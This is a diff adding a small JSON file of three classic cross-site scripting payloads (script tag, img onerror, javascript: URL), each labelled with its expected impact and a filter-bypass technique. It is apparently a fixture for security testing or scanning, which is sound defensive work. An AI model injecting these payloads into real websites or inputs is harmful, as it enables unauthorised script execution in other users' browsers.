@@ -1,0 +1,20 @@
+[
+  {
+    "payload": "<script>alert('XSS')</script>",
+    "description": "Basic script tag injection",
+    "expected_impact": "JavaScript execution in browser",
+    "detection_bypass_technique": "Direct injection"
+  },
+  {
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "description": "Image tag with onerror event",
+    "expected_impact": "JavaScript execution via event handler",
+    "detection_bypass_technique": "Event handler injection"
+  },
+  {
+    "payload": "javascript:alert('XSS')",
+    "description": "JavaScript protocol injection",
+    "expected_impact": "JavaScript execution in href/src attributes",
+    "detection_bypass_technique": "Protocol handler abuse"
+  }
+]
